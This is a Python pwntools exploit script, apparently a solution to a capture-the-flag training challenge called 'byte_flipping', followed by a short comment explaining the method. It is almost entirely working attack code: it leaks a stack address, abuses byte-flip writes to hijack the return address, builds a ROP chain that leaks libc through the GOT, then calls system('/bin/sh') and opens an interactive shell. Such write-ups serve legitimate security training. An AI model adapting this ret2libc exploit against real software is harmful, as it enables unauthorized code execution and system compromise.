from pwn import *
from time import sleep
import sys

SERVER = "bin.training.offdef.it"
PORT = "4003"
BINARY = "./byte_flipping"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv: 
    gdb.attach(r, """
        #breakpoints
        b* 004008c5
        b* 0x0400a7b
        b* 0x00400ac7
        b* 0x00400aad
        b* 0x400a11
        b* 0x400a80
        c
        """)
    input("wait")


#code
timesleep=0.1
flips= 0x602068 #addr where flips are saved

#sending bin/sh in name
str = b"/bin/sh"+b"A"*(32-7)
r.send(str)
sleep(timesleep)

#leaking stack addr and calculated other addresses (more or less useless)
r.recvuntil(str)
leaked_stack = u64(r.recvuntil(b"\x7f")+b"\x00\x00")
main_stack = leaked_stack+ 0x48
game_stack = leaked_stack+ 0x38
possible_libc = main_stack + 0xb8
offset_libc  = 0x1e40

print(hex(leaked_stack))
print(" [!] game stack addr: %#x" % game_stack)
print(" [!] libc stack addr: %#x" % possible_libc)
sleep(timesleep)

#overwriting the flips and the return addr
r.sendline(hex(flips))
sleep(timesleep)
r.sendline(b"FF")
sleep(timesleep)
r.sendline(hex(game_stack))
sleep(timesleep)
r.sendline(b'ff')
sleep(timesleep)
r.sendline(hex(game_stack+1))
sleep(timesleep)
r.sendline(b'7')
remaining_writes = 0xFF

#now stack setted accordly 
newstack = game_stack
rip = game_stack
print(" [!] newstack addr: %#x" % newstack)


#function needed now to load on stack stuff (just use push_chain)
def load_on_stack(addr):
    global remaining_writes
    global newstack

    remaining_writes-=0x8
    if remaining_writes<=0 :
        print("!!! TOO MANY WRITES!!!")
        exit()

    
    load_there(newstack,addr)
    newstack+=0x8

def load_there(where, what):
    array = [hex(what)[i:i+2] for i in range(0, len(hex(what)), 2)]
    array.pop(0)
    length= len(array) 

    for i in range(length, 8):
        array.insert(0, '0')

    if length>8 or length==0  :
        print("!!!! NOT AN ADDRESS !!!!")
        exit()

    i=7
    for x in array:
        sleep(timesleep)
        r.sendline(hex(where+i))
        i-=1
        sleep(timesleep)
        r.recv()
        r.sendline(x)

    print("[!] loaded %#x in " %what, "%#x" %where)

def pushchain(chain):
    for i in chain: 
        load_on_stack(i)

#useful gadgets
pop_rdi= 0x400b33
pop_rsi_r15= 0x400b31

#setting \n binsh
binsh = 0x6020a0 #global name addr
r.sendline(hex(binsh+7))
sleep(timesleep)
r.sendline(b'0')
sleep(timesleep)

#useful addr
play = 0x4009cd
puts = 0x400666

#leaking libc
chain = [
    pop_rdi, 
    0x602028,
    puts,
    play
]

pushchain(chain)
sleep(timesleep)
r.sendline(b"0")
r.recvuntil(b"/bin/sh :)\n")
libc_addr = u64(r.recvuntil(b"\x7f")+b"\x00\x00") - 0x38770
print(" [!] libc addr: %#x" % libc_addr)

#reset the stack addr
newstack = game_stack+0x20

#setting the libc
libc= ELF("./libc-2.35.so")
libc.address = libc_addr -0x28000
system = libc.symbols['system'] #get system() function addr
print("[!] sys addr: %#x" % system)

#make the real exploit
chain=[
    pop_rsi_r15,
    0x0,
    0x0,
    pop_rdi, 
    binsh,
    system  
]

pushchain(chain)
sleep(timesleep)
input("wait")
r.sendline(b"0")
input("wait")

r.interactive()

'''
In this challenge the first goal was to unlock the number of times we can overwrite a byte in memory, so 
with the first available write I wrote FF in the flip address (global variable found). 
Now the goal is to overwrite some bytes in order to jump again into the do-while. To do so I wrote in the "gamestack"
(basically the return addr) 2 bytes to jump before the "play" call in game. Ok we are again inside the do-while
with ff available writes. Nice, we can now project our ROP chain. 
With the first read I put (the player name) '/bin/shAAAAAA' so I had to put the \x00 
after binsh with one of th writes. Ok now I start to build the chain putting stuff on the stack. 
With the first chain I could leak the address of the libc by printing the 0x602028 addr (printf got) and the later 
re-jump in the "play". Once I had the libc I watched the offset to set the correct libc addr and then I looked
for the system() function in the library. At the end I used another rop chain to let me call the system() function
putting "/bin/sh\x00" in the register. 

'''